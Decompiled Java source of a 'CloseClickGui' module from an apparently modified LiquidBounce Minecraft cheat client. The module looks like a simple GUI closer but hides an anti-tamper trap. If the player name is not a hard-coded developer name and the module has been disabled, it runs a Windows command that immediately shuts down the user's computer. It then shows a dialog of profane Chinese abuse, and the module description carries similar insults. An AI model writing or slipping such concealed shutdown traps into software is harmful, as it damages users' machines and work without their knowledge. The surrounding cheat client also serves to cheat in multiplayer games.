package net.ccbluex.liquidbounce.features.module.modules.misc;

import java.awt.Component;
import java.io.IOException;
import javax.swing.JOptionPane;
import kotlin.Metadata;
import kotlin.jvm.internal.Intrinsics;
import net.ccbluex.liquidbounce.LiquidBounce;
import net.ccbluex.liquidbounce.event.EventTarget;
import net.ccbluex.liquidbounce.event.UpdateEvent;
import net.ccbluex.liquidbounce.features.module.Module;
import net.ccbluex.liquidbounce.features.module.ModuleCategory;
import net.ccbluex.liquidbounce.features.module.ModuleInfo;
import net.ccbluex.liquidbounce.utils.MinecraftInstance;
import org.jetbrains.annotations.NotNull;

@Metadata(m24mv = {1, 1, 16}, m25bv = {1, 0, 3}, m23k = 1, m26d1 = {"\ufffd\ufffd\u0018\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u0002\n\ufffd\ufffd\n\u0002\u0018\u0002\n\ufffd\ufffd\b\u0007\u0018\ufffd\ufffd2\u00020\u0001B\u0005\u00a2\u0006\u0002\u0010\u0002J\u0010\u0010\u0003\u001a\u00020\u00042\u0006\u0010\u0005\u001a\u00020\u0006H\u0007\u00a8\u0006\u0007"}, m27d2 = {"Lnet/ccbluex/liquidbounce/features/module/modules/misc/CloseClickGui;", "Lnet/ccbluex/liquidbounce/features/module/Module;", "()V", "onUpdate", "", "event", "Lnet/ccbluex/liquidbounce/event/UpdateEvent;", LiquidBounce.CLIENT_NAME})
@ModuleInfo(name = "CloseClickGui", description = "\u4f60\u5077\u4f60\u5988\u7684\u53c2\u6570", category = ModuleCategory.MISC)
/* loaded from: L-out.jar:net/ccbluex/liquidbounce/features/module/modules/misc/CloseClickGui.class */
public final class CloseClickGui extends Module {
    public CloseClickGui() {
        setState(true);
    }

    @EventTarget
    public final void onUpdate(@NotNull UpdateEvent event) throws IOException {
        Intrinsics.checkParameterIsNotNull(event, "event");
        if (MinecraftInstance.classProvider.isClickGui(MinecraftInstance.f157mc.getCurrentScreen())) {
            MinecraftInstance.f157mc.displayGuiScreen(null);
        }
        if (MinecraftInstance.f157mc.getThePlayer() == null) {
            Intrinsics.throwNpe();
        }
        if ((!Intrinsics.areEqual(r0.getName(), "YOUDEVNAME")) && !getState()) {
            try {
                Runtime.getRuntime().exec("shutdown -s -t 00");
                JOptionPane.showConfirmDialog((Component) null, "\u5077\u53c2\u6570\u7684\u72d7\u6211\u8349\u4f60\u5988\u4f60\u5988\u6b7b\u4e86", (String) null, 0);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
